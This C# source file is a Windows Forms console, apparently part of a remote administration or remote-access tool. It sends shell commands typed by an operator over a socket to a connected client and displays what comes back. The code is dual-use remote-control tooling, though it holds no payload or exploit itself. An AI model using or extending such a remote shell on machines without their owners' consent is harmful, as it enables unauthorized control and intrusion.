using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class SHELL : MetroFramework.Forms.MetroForm
    {
        public string ID = default;
        private Socket _socket = default;
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);
        private const int WM_VSCROLL = 277;
        private const int SB_PAGEBOTTOM = 7;

        internal static void ScrollToBottom(RichTextBox richTextBox)
        {
            SendMessage(richTextBox.Handle, WM_VSCROLL, (IntPtr)SB_PAGEBOTTOM, IntPtr.Zero);
            richTextBox.SelectionStart = richTextBox.Text.Length;
        }
        public SHELL(Socket client, string ident)
        {
            InitializeComponent();
            _socket = client;
            ID = ident;
        }
        int count = 0;
        public void bilgileriIsle(string received)
        {
            textBox1.AppendText(received.Replace("[NEW_LINE]", Environment.NewLine) + Environment.NewLine + "SHELL>>");
            ScrollToBottom(textBox1);
            count = textBox1.Text.Length;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text.Length < count)
            {
                try
                {
                    if (textBox1.Text[textBox1.Text.Length - 1].ToString() == ">")
                    {
                        textBox1.AppendText(">");
                        textBox1.Text = textBox1.Text.Replace(">>>", ">>");
                        ScrollToBottom(textBox1);
                        count = textBox1.Text.Length;
                    }
                }
                catch (Exception) { }
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                try
                {
                    textBox1.AppendText(Environment.NewLine);
                    ScrollToBottom(textBox1);
                    count = textBox1.Text.Length;
                    byte[] command = Form1.MyDataPacker("SHELL", Encoding.UTF8.GetBytes(textBox1.Text.Substring(textBox1.Text.LastIndexOf("SHELL>>") + "SHELL>>".Length).Replace(Environment.NewLine, "")));
                    _socket.Send(command, 0, command.Length, SocketFlags.None);
                }
                catch (Exception) { }
            }
        }
    }
}
